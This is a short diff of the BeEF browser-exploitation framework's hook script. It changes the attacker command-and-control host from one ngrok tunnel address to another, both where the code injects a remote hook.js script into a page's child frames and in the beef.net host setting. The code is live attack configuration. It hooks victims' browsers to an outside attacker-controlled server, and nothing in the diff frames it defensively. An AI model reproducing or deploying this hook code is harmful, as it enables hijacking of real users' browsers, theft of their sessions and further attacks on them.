@@ -8887,7 +8887,7 @@ beef.browser = {
         // create script object
         var script = document.createElement('script');
         script.type = 'text/javascript';
-        script.src = 'https://d1136689.ngrok.io/hook.js';
+        script.src = 'https://1bbc5c11.ngrok.io/hook.js';
 
         // loop through child frames
         for (var i = 0; i < self.frames.length; i++) {
@@ -11662,7 +11662,7 @@ beef.regCmp('beef.logger');
  */
 beef.net = {
 
-    host: "d1136689.ngrok.io",
+    host: "1bbc5c11.ngrok.io",
     port: "443",
     hook: "/hook.js",
     httpproto: "https",
